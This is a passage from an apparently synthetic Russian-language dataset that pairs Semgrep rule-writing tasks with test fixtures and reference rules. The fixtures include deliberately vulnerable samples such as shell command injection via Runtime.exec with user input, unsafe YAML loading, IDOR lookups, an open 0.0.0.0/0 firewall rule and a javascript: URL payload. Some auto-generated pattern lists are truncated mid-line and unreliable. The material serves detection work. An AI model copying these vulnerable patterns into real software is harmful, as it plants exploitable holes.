    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: avoid-unsafe-ruamel.py\nfrom ruamel.yaml import YAML\n\n#ok:avoid-unsafe-ruamel\ny1 = YAML()  # default is 'rt'\n\n#ok:avoid-unsafe-ruamel\ny2 = YAML(typ='rt')\n\n#ok:avoid-unsafe-ruamel\ny3 = YAML(typ='safe')\n\n#ruleid:avoid-unsafe-ruamel\ny3 = YAML(typ='unsafe')\n\n#ruleid:avoid-unsafe-ruamel\ny4 = YAML(typ='base')  # Ограничиваем длину\n\nОпасные паттерны:\n• ruamel.yaml.YAML(typ='unsafe')\n• ruamel.yaml.YAML(typ='base')\n\nБезопасные паттерны:  \n• ruamel.yaml.YAML(typ='rt')\n• ruamel.yaml.YAML(typ='safe')\n\nЛегенда аннотаций:\n- // ruleid:avoid-unsafe-ruamel: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-unsafe-ruamel: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-unsafe-ruamel\n  metadata:\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    references:\n    - https://yaml.readthedocs.io/en/latest/basicuse.html?highlight=typ\n    category: security\n    technology:\n    - ruamel.yaml\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - python\n  message: >-\n    Avoid using unsafe `ruamel.yaml.YAML()`. `ruamel.yaml.YAML` can\n    create arbitrary Python objects. A malicious actor could exploit\n    this to run arbitrary code. Use `YAML(typ='rt')` or\n    `YAML(typ='safe')` instead.\n  severity: ERROR\n  pattern-either:\n  - pattern: ruamel.yaml.YAML(..., typ='unsafe', ...)\n  - pattern: ruamel.yaml.YAML(..., typ='base', ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции ruamel.yaml.YAML(), где параметр typ установлен в 'unsafe' или 'base'. Эти значения могут привести к десериализации небезопасных данных, что позволяет злоумышленнику выполнить произвольный код. Правило использует оператор pattern-either для проверки обоих недопустимых значений параметра typ.\n\n# Ключевые элементы:\n- ID: avoid-unsafe-ruamel\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "avoid-unsafe-ruamel",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: plaintext-http-link\nОписание уязвимости: This link points to a plaintext HTTP URL. Prefer an encrypted HTTPS URL if possible.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: html",
    "input": "Требования:\n- Язык: html\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: plaintext-http-link.html\n<!-- ruleid: plaintext-http-link -->\n<a href=\"http://semgrep.dev\">Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a href='http://semgrep.dev'>Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a href=http://semgrep.dev>Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a class=\"foo\" href=\"http://semgrep.dev\">Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a class='foo' href='http://semgrep.dev'>Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a class=foo href=http://semgrep.dev>Semgrep</a>\n\n<!-- ruleid: plaintext-http-link -->\n<a href=\"HTTP://SEMGREP.DEV\">Semgrep</a>\n\n<!-- ok: plaintext-http-link -->\n<a href=\"https://semgrep.dev\">Semgrep</a>\n\n<!-- ok: plaintext-http-link -->\n<a href=\"https://semgrep.dev/http://\">Semgrep</a>\n\n<!-- ok: plaintext-http-link -->\n<a href=\"javascript:alert(1)\">Semgrep</a>  # Ограничиваем длину\n\nОпасные паттерны:\n• <a href=\"http://semgrep.dev\">Semgrep</a>\n• <a href='http://semgrep.dev'>Semgrep</a>\n• <a href=http://semgrep.dev>Semgrep</a>\n\nБезопасные паттерны:  \n• <a href=\"https://semgrep.dev\">Semgrep</a>\n• <a href=\"https://semgrep.dev/http://\">Semgrep</a>\n• <a href=\"javascript:alert(1)\">Semgrep</a>\n\nЛегенда аннотаций:\n- // ruleid:plaintext-http-link: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:plaintext-http-link: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: plaintext-http-link\n  metadata:\n    category: security\n    technology:\n    - html\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    confidence: HIGH\n    subcategory:\n      - vuln\n    references:\n    - https://cwe.mitre.org/data/definitions/319.html\n    likelihood: LOW\n    impact: LOW\n  patterns:\n  - pattern: <a href=\"$URL\">...</a>\n  - metavariable-regex:\n      metavariable: $URL\n      regex: '^(?i)http://'\n  message: >-\n    This link points to a plaintext HTTP URL. Prefer an encrypted HTTPS URL if possible.\n  severity: WARNING\n  languages: [html]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска HTML-тегов <a>, у которых атрибут href содержит ссылку, начинающуюся с 'http://'. Паттерн использует регулярное выражение для проверки начала ссылки с регистра 'http://', игнорируя регистр ('^(?i)http://'). Правило применимо только к HTML-коду. Примеры опасного кода содержат явные ссылки на http-протокол, тогда как безопасный код либо использует https, либо другой тип ссылок.\n\n# Ключевые элементы:\n- ID: plaintext-http-link\n- Язык: html \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "plaintext-http-link",
      "language": "html",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: prefer-apt-get\nОписание уязвимости: 'apt-get' is preferred as an unattended tool for stability. 'apt' is discouraged.\nCWE: \nТип анализа: search\nЯзык: dockerfile",
    "input": "Требования:\n- Язык: dockerfile\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: prefer-apt-get.dockerfile\n# cf. https://github.com/hadolint/hadolint/wiki/DL3027\n\nFROM busybox\n\n# ruleid: prefer-apt-get\nRUN apt install curl=1.1.0\n\n# ok: prefer-apt-get\nRUN apt-get install curl=1.1.0  # Ограничиваем длину\n\nОпасные паттерны:\n• FROM busybox\nRUN apt install curl=1.1.0\n• FROM busybox\nRUN apt update && apt install curl=1.1.0\n\nБезопасные паттерны:  \n• FROM busybox\nRUN apt-get install curl=1.1.0\n• FROM busybox\nRUN apt-get update && apt-get install curl=1.1.0\n\nЛегенда аннотаций:\n- // ruleid:prefer-apt-get: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:prefer-apt-get: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: prefer-apt-get\n    severity: INFO\n    languages: [dockerfile]\n    patterns:\n      - pattern: RUN apt ...\n      - pattern-not: RUN apt-get ...\n    message: >-\n      'apt-get' is preferred as an unattended tool for stability. 'apt' is discouraged.\n    metadata:\n      source-rule-url: https://github.com/hadolint/hadolint/wiki/DL3027\n      references:\n        - https://github.com/hadolint/hadolint/wiki/DL3027\n      category: best-practice\n      technology:\n        - dockerfile\n\n\n# Логика правила:\nЭто правило Semgrep выполняет поиск конструкций в Dockerfile, где используется команда 'RUN'. Внутри этой конструкции ищется шаблон 'apt ...', который является основным паттерном. Дополнительно применяется отрицательный паттерн 'RUN apt-get ...', чтобы исключить случаи, когда 'apt-get' уже используется. Правило выдает предупреждение, если основной паттерн найден без отрицательного.\n\n# Ключевые элементы:\n- ID: prefer-apt-get\n- Язык: dockerfile \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "prefer-apt-get",
      "language": "dockerfile",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: azure-sqlserver-no-public-access\nОписание уязвимости: Ensure no SQL Databases allow ingress from 0.0.0.0/0 (ANY IP)\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-sqlserver-no-public-access.tf\n# fail\n# ruleid: azure-sqlserver-no-public-access\nresource \"azurerm_mysql_firewall_rule\" \"example\" {\n  name                = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_mysql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"255.255.255.255\"\n}\n\n# pass\nresource \"azurerm_mysql_firewall_rule\" \"example\" {\n  name                = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_mysql_server.example.name\n  start_ip_address    = \"0.0.0.0\"\n  end_ip_address      = \"0.0.0.0\"\n}\n\n# pass\nresource \"azurerm_mysql_firewall_rule\" \"example\" {\n  name                = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name         = azurerm_mysql_server.example.name\n  start_ip_address    = \"40.112.8.12\"\n  end_ip_address      = \"40.112.8.17\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_mysql_firewall_rule\" \"example\" { \n  name = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name = azurerm_mysql_server.example.name\n  start_ip_address =\n• resource \"azurerm_mysql_firewall_rule\" \"example\" { \n  name = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name = azurerm_mysql_server.example.name\n  start_cidr = \"0.0.\n• resource \"azurerm_mysql_firewall_rule\" \"example\" { \n  name = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name = azurerm_mysql_server.example.name\n  start_cidr = \"0.0.\n\nБезопасные паттерны:  \n• resource \"azurerm_mysql_firewall_rule\" \"example\" { \n  name = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name = azurerm_mysql_server.example.name\n  start_ip_address =\n• resource \"azurerm_mysql_firewall_rule\" \"example\" { \n  name = \"office\"\n  resource_group_name = azurerm_resource_group.example.name\n  server_name = azurerm_mysql_server.example.name\n  start_ip_address =\n\nЛегенда аннотаций:\n- // ruleid:azure-sqlserver-no-public-access: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-sqlserver-no-public-access: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-sqlserver-no-public-access\n  message: >-\n    Ensure no SQL Databases allow ingress from 0.0.0.0/0 (ANY IP)\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_mysql_firewall_rule\" \"...\" {\n      ...\n      start_ip_address    = \"0.0.0.0\"\n      end_ip_address      = \"255.255.255.255\"\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure MySQL firewall rules, где указаны стартовый и конечный IP-адреса, разрешающие доступ от любого IP-адреса (0.0.0.0/0 до 255.255.255.255). Опасный пример содержит неправильные значения этих полей, разрешая доступ ко всем IP-адресам, тогда как безопасный пример либо не использует диапазон 0.0.0.0/0-255.255.255.255, либо задает конкретные IP-адреса.\n\n# Ключевые элементы:\n- ID: azure-sqlserver-no-public-access\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-sqlserver-no-public-access",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: use-raise-for-status\nОписание уязвимости: There's an HTTP request made with requests, but the raise_for_status() utility method isn't used. This can result in request errors going unnoticed and your code behaving in unexpected ways, such as if your authorization API returns a 500 error while you're only checking for a 401.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-raise-for-status.py\nimport requests\n\n# ruleid:use-raise-for-status\nrequests.put(\"\")\n\nrequests.put\nrequests.put(\"\").raise_for_status(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    return requests.get(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    return requests.post(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    return requests.put(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    return requests.patch(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    return requests.delete(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    requests.put(\"\")\n\ndef f():\n    # ruleid:use-raise-for-status\n    r = requests.get(\"\")\n    return r\n\ndef f():\n    # ruleid:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status\n    return r\n\ndef f():\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status()\n    # ruleid:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status\n    return r\n\ndef f():\n    # ruleid:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status()\n    return r\n\ndef f():\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    r.raise_for_status()\n    return r\n\ndef f():\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    if r.status_code != requests.codes.ok:\n        logging.error(\"Something awful happened\", r)\n    return r\n\ndef f():\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    if not r.ok:\n        logging.error(\"Something awful happened\", r)\n    return r\n\ndef f():\n    # ok:use-raise-for-status\n    r = requests.get(\"\")\n    if r.ok:\n        return r\n\ndef f():\n    # ok:use-raise-for-status\n    requests.put(\"\").raise_for_status()\n\ndef f():\n    # ok:use-raise-for-status\n    from contextlib import nullcontext\n    with nullcontext():\n        r = requests.post(\"\")\n    r.raise_for_status()\n\ndef f():\n    # ok:use-raise-for-status\n    from contextlib import nullcontext\n    with nullcontext(value  # Ограничиваем длину\n\nОпасные паттерны:\n• requests.put(\\\n• )\n• return requests.get(\\\n\nБезопасные паттерны:  \n• requests.put(\\\n• ).raise_for_status()\n• r = requests.get(\\\n\nЛегенда аннотаций:\n- // ruleid:use-raise-for-status: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-raise-for-status: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: use-raise-for-status\n    patterns:\n      - pattern-either:\n          - pattern: requests.request(...)\n          - pattern: requests.get(...)\n          - pattern: requests.post(...)\n          - pattern: requests.put(...)\n          - pattern: requests.delete(...)\n          - pattern: requests.head(...)\n          - pattern: requests.patch(...)\n      - pattern-not-inside: |\n          $RESP = requests.$METHOD(...)\n          $RESP.raise_for_status(...)\n      - pattern-not-inside: |\n          requests.$METHOD(...).raise_for_status(...)\n      - pattern-not-inside: |\n          $RESP = requests.$METHOD(...)\n          if $RESP.status_code == ...:\n            ...\n      - pattern-not-inside: |\n          $RESP = requests.$METHOD(...)\n          if $RESP.status_code != ...:\n            ...\n      - pattern-not-inside: |\n          $RESP = requests.$METHOD(...)\n          ...\n          if $RESP.ok:\n            ...\n      - pattern-not-inside: |\n          $RESP = requests.$METHOD(...)\n          ...\n          if not $RESP.ok:\n            ...\n      - pattern-not-inside: |\n          with ...:\n            ...\n            $RESP = requests.$METHOD(...)\n            ...\n          $RESP.raise_for_status(...)\n      - pattern-not-inside: |\n          with ... as ...:\n            ...\n            $RESP = requests.$METHOD(...)\n            ...\n          $RESP.raise_for_status(...)\n    message: >-\n      There's an HTTP request made with requests,\n      but the raise_for_status() utility method isn't used.\n      This can result in request errors going unnoticed\n      and your code behaving in unexpected ways,\n      such as if your authorization API returns a 500 error\n      while you're only checking for a 401.\n    metadata:\n      references:\n        - https://requests.readthedocs.io/en/master/api/#requests.Response.raise_for_status\n      category: best-practice\n      technology:\n        - requests\n    severity: WARNING\n    languages:\n      - python\n\n\n# Логика правила:\nТип анализа: поиск (search) Язык: Python Цель правила — обнаружить случаи, когда запросы выполняются с использованием библиотеки requests, но метод raise_for_status не вызывается. Структура паттерна: сначала обнаруживаются вызовы методов запросов (get, post, put, delete и др.), затем проверяется отсутствие вызова метода raise_for_status внутри блока, где создается объект запроса ($RESP). Метапеременные: используются метапеременные $RESP и $METHOD для представления объекта ответа и имени метода соответственно.\n\n# Ключевые элементы:\n- ID: use-raise-for-status\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-raise-for-status",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: check-unscoped-find\nОписание уязвимости: Found an unscoped `find(...)` with user-controllable input. If the ActiveRecord model being searched against is sensitive, this may lead to Insecure Direct Object Reference (IDOR) behavior and allow users to read arbitrary records. Scope the find to the current user, e.g. `current_user.accounts.find(params[:id])`.\nCWE: CWE-639: Authorization Bypass Through User-Controlled Key\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-639: Authorization Bypass Through User-Controlled Key\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: check-unscoped-find.rb\nclass GroupsController < ApplicationController\n\n  def show\n    #ruleid: check-unscoped-find\n    @user = User.find(params[:id])\n\n    respond_to do |format|\n      format.html # show.html.erb\n      format.json { render :json => @user }\n    end\n  end\n\n  def show_ok\n    #ok: check-unscoped-find\n    @user = User.find(session[:id])\n\n    respond_to do |format|\n      format.html # show.html.erb\n      format.json { render :json => @user }\n    end\n  end\n\n  def show_ok2\n    #ok: check-unscoped-find\n    current_user = User.find(session[:id])\n    #ok: check-unscoped-find\n    current_user.accounts.find(param[:id])\n\n    respond_to do |format|\n      format.html # show.html.erb\n      format.json { render :json => @user }\n    end\n  end\n\n  def get\n    #ruleid: check-unscoped-find\n    @some_record = SomeRecord.find_by_id!(params[:id])\n\n    respond_to do |format|\n      format.html # show.html.erb\n      format.json { render :json => @user }\n    end\n  end\n\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• User.find(params[:id])\n• SomeRecord.find_by_id!(params[:id])\n• Account.find(cookies['id'])\n\nБезопасные паттерны:  \n• User.find(session[:id])\n• current_user.accounts.find(params[:id])\n• Model.find(current_user.id)\n\nЛегенда аннотаций:\n- // ruleid:check-unscoped-find: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:check-unscoped-find: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: check-unscoped-find\n  mode: taint\n  pattern-sources:\n  - pattern-either:\n    - pattern: |\n        cookies[...]\n    - patterns:\n      - pattern: |\n          cookies. ... .$PROPERTY[...]\n      - metavariable-regex:\n          metavariable: $PROPERTY\n          regex: (?!signed|encrypted)\n    - pattern: |\n        params[...]\n    - pattern: |\n        request.env[...]\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $MODEL.find(...)\n      - pattern: $MODEL.find_by_id(...)\n      - pattern: $MODEL.find_by_id!(...)\n    - metavariable-regex:\n        metavariable: $MODEL\n        regex: '[A-Z]\\S+'\n  message: Found an unscoped `find(...)` with user-controllable input. If the ActiveRecord model being\n    searched against is sensitive, this may lead to Insecure Direct Object Reference (IDOR) behavior and\n    allow users to read arbitrary records. Scope the find to the current user, e.g. `current_user.accounts.find(params[:id])`.\n  languages:\n  - ruby\n  severity: WARNING\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_unscoped_find.rb\n    category: security\n    cwe:\n    - 'CWE-639: Authorization Bypass Through User-Controlled Key'\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    technology:\n    - ruby\n    - rails\n    references:\n    - https://brakemanscanner.org/docs/warning_types/unscoped_find/\n    - https://github.com/presidentbeef/brakeman/blob/main/test/apps/rails3.1/app/controllers/users_controller.rb\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных вызовов метода find или find_by_id в Ruby on Rails, где идентификатор записи контролируется пользователем напрямую через параметры запроса (cookies, params, request.env). Правило проверяет наличие потенциально опасных источников данных (cookies, параметры запроса, данные из окружения), которые передаются в метод find модели ActiveRecord без явной привязки к текущему пользователю. Это может привести к уязвимости IDOR (Insecure Direct Object Reference), позволяющей пользователям читать произвольные записи.\n\n# Ключевые элементы:\n- ID: check-unscoped-find\n- Язык: ruby \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "check-unscoped-find",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-backup-vault-unencrypted\nОписание уязвимости: The AWS Backup vault is unencrypted. The AWS KMS encryption key protects backups in the Backup vault. To create your own, create a aws_kms_key resource or use the ARN string of a key in your account.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-backup-vault-unencrypted.tf\n# ruleid: aws-backup-vault-unencrypted\nresource \"aws_backup_vault\" \"backup\" {\n    name = \"example_backup_vault\"\n}\n\n# ok: aws-backup-vault-unencrypted\nresource \"aws_backup_vault\" \"backup_with_kms_key\" {\n    name = \"example_backup_vault\"\n    kms_key_arn = aws_kms_key.example.arn\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_backup_vault\" \"backup\" { \n    name = \"example_backup_vault\"\n}\n• resource \"aws_backup_vault\" \"unencrypted\" { \n    name = \"example_unencrypted_vault\"\n}\n• resource \"aws_backup_vault\" \"no_kms\" { \n    name = \"example_no_kms_vault\"\n}\n\nБезопасные паттерны:  \n• resource \"aws_backup_vault\" \"backup_with_kms\" { \n    name = \"example_backup_vault_with_kms\"\n    kms_key_arn = aws_kms_key.example.arn\n}\n• resource \"aws_backup_vault\" \"with_kms\" { \n    name = \"example_with_kms_vault\"\n    kms_key_arn = var.kms_arn\n}\n• resource \"aws_backup_vault\" \"kms_arn\" { \n    name = \"example_kms_arn_vault\"\n    kms_key_arn = data.aws_kms_key.example.arn\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-backup-vault-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-backup-vault-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-backup-vault-unencrypted\n  patterns:\n  - pattern-not-inside: |\n      resource \"aws_backup_vault\" $BACKUP {\n        ...\n        kms_key_arn = ...\n        ...\n      }\n  - pattern: resource \"aws_backup_vault\" $BACKUP {...}\n  message: The AWS Backup vault is unencrypted. The AWS KMS encryption key protects backups in the Backup\n    vault. To create your own, create a aws_kms_key resource or use the ARN string of a key in your account.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    technology:\n    - aws\n    - terraform\n    category: security\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов aws_backup_vault без атрибута kms_key_arn, который указывает на отсутствие шифрования Vault. Паттерн сначала исключает случаи, когда внутри блока ресурса присутствует атрибут kms_key_arn, затем ищет сам ресурс aws_backup_vault без этого атрибута. Правило применимо только к конфигурационному файлу Terraform формата HCL.\n\n# Ключевые элементы:\n- ID: aws-backup-vault-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-backup-vault-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: google-maps-apikeyleak\nОписание уязвимости: Detects potential Google Maps API keys in code\nCWE: CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: google-maps-apikeyleak.generic\n# ruleid: google-maps-apikeyleak\nAIzaSyAOVYRIgupAurZup5y1PRh8Ismb1A3lLao  # Ограничиваем длину\n\nОпасные паттерны:\n• const apiKey = 'AIzaSyAOVYRIgupAurZup5y1PRh8Ismb1A3lLao';\n• let key = 'AIzaSyBCD123456789012345678901234567890';\n• var mapApiKey = 'AIzaSyXYZabcdef1234567890123456789012345';\n\nБезопасные паттерны:  \n• const secretKey = 'abc123';\n• let token = 'xyz456';\n• var otherKey = 'def789';\n\nЛегенда аннотаций:\n- // ruleid:google-maps-apikeyleak: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:google-maps-apikeyleak: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: google-maps-apikeyleak\n    patterns:\n      - pattern-regex: ^(AIza[0-9A-Za-z_-]{35}(?!\\S))$\n    message: Detects potential Google Maps API keys in code\n    languages:\n      - generic\n    severity: WARNING\n    metadata:\n      description: Detects potential Google Maps API keys in code\n      severity: MEDIUM\n      category: security\n      confidence: MEDIUM\n      impact: HIGH\n      likelihood: MEDIUM\n      subcategory:\n        - audit\n      owasp:\n        - A3:2017 Sensitive Data Exposure\n      references:\n        - https://ozguralp.medium.com/unauthorized-google-maps-api-key-usage-cases-and-why-you-need-to-care-1ccb28bf21e\n      cwe:\n        - \"CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\"\n      technology:\n        - Google Maps\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных утечек ключей Google Maps API в коде. Оно использует регулярное выражение для выявления строк, начинающихся с 'AIza' и следующих за ними 35 символов алфавита и цифр, после которых не следует другой символ (для предотвращения ложных срабатываний). Паттерн настроен так, чтобы обнаруживать только полные ключи API, исключая частичные или некорректные значения.\n\n# Ключевые элементы:\n- ID: google-maps-apikeyleak\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "google-maps-apikeyleak",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения command-injection-formatted-runtime-call\nОписание уязвимости: A formatted or concatenated string was detected as input to a java.lang.Runtime call. This is dangerous if a variable is controlled by user input and could result in a command injection. Ensure your variables are not controlled by users or sufficiently sanitized.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: command-injection-formatted-runtime-call.java\nimport java.lang.Runtime;\n\nclass Cls {\n\n    public Cls(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ruleid: command-injection-formatted-runtime-call\n        r.exec(\"/bin/sh -c some_tool\" + input);\n    }\n\n    public void test1(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ruleid: command-injection-formatted-runtime-call\n        r.loadLibrary(String.format(\"%s.dll\", input));\n    }\n\n    public void test2(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ruleid: command-injection-formatted-runtime-call\n        r.exec(\"bash\", \"-c\", input);\n    }\n\n    public void test3(String input) {\n        // ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().loadLibrary(String.format(\"%s.dll\", input));\n    }\n\n    public void test4(String input) {\n        // ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().exec(\"bash\", \"-c\", input);\n    }\n\n    public void okTest(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ok: command-injection-formatted-runtime-call\n        r.exec(\"echo 'blah'\");\n    }\n\n    public void okTest2(String input) {\n        // ok: command-injection-formatted-runtime-call\n        Runtime.getRuntime().loadLibrary(\"lib.dll\");\n    }\n\n    public void test6(String input) {\n        String[] envp = new String[]{\"-c\"};\n        // ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().exec(\"bash\", envp, input);\n    }\n\n    public void test6(String input) {\n        String[] command = new String[]{\"bash\"};\n        String[] envp = new String[]{\"-c\"};\n        // 